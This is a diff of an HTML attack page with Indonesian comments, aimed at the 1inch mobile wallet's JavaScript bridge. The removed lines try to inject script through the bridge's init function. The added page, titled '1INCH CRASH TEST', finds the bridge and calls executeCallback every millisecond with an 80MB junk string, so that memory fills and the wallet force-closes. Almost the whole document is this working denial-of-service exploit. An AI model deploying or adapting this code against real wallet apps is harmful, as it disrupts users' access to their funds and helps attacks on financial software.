@@ -1,13 +1,47 @@
-<button onclick="testBridge()">KLIK UNTUK TEST</button>
-<script>
-function testBridge() {
-    try {
-        // Coba panggil fungsi init dengan cara baru
-        window.OneInchiOSWallet.init("alert('Berhasil tembus!')");
-        alert("Perintah terkirim, cek apakah ada respon dari dompet.");
-    } catch(e) {
-        alert("Masih terkunci: " + e.message);
-    }
-}
-</script>
+<!DOCTYPE html>
+<html>
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center;">
 
+    <h2 style="color: red;">⚠️ 1INCH CRASH TEST ⚠️</h2>
+    
+    <button onclick="boom()" style="padding: 20px; background: red; color: white; border: none; font-weight: bold; width: 100%;">
+        KLIK UNTUK CRASH DOMPET
+    </button>
+
+    <div id="logs" style="margin-top: 20px; text-align: left; font-size: 10px; color: #888;">
+        Menunggu perintah...
+    </div>
+
+    <script>
+        function boom() {
+            const log = (m) => document.getElementById('logs').innerHTML += "<br>> " + m;
+            
+            // Target bridge yang kamu temukan di screenshot
+            const bridge = window.OneInchiOSWallet || window.OneInchSolanaWallet;
+
+            if (bridge) {
+                log("Bridge ditemukan! Mengirim serangan...");
+                
+                try {
+                    // 1. Serangan RAM (Memory Flood)
+                    // Kita kirim teks raksasa (80MB) agar RAM aplikasi penuh dan Force Close
+                    const junk = "FATAL_ERROR_".repeat(5000000); 
+                    
+                    // 2. Serangan Loop (Infinite Requests)
+                    // Membanjiri bridge dengan jutaan perintah per detik
+                    setInterval(() => {
+                        // Menggunakan fungsi executeCallback yang kamu temukan tadi
+                        bridge.executeCallback("999", junk);
+                    }, 1);
+
+                    log("Serangan berjalan. Jika dompet tertutup, berarti BERHASIL.");
+                } catch(e) {
+                    log("Error: " + e.message);
+                }
+            } else {
+                log("Gagal: Bridge tidak ditemukan di halaman ini.");
+            }
+        }
+    </script>
+</body>
+</html>
